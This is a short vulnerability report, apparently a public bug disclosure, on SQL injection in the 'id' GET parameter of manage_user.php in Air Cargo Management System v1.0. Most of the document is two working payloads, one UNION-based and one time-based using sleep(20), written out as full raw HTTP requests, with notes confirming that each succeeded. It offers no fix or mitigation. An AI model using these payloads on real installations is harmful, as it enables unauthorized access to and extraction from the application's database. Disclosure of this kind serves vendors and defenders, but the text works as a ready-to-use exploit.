# Air Cargo Management System v1.0 has SQL injection

BUG_Author: lizhe

Website source address:https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

Vulnerability File: /acms/admin/user/manage_user.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-1' union all select null,null,null,concat(0x32333435,0x52535455,0x62636465),null,null,null,null,null,null-- -

```
GET /acms/admin/user/manage_user.php?id=-1%27%20union%20all%20select%20null,null,null,concat(0x32333435,0x52535455,0x62636465),null,null,null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=b474rdfl9bppo3rms87201i42t
Connection: close
```

union query success

![image](https://github.com/west9b/bug_report/blob/main/sql1.png)

Payload2:id=1' and (select 1 from (select(sleep(20)))a) and 'c'='c

```
GET /acms/admin/user/manage_user.php?id=1%27%20and%20(select%201%20from%20(select(sleep(20)))a)%20and%20%27c%27=%27c HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=b474rdfl9bppo3rms87201i42t
Connection: close
```

Server response time is 20 seconds

![image](https://github.com/west9b/bug_report/blob/main/sql2.png)
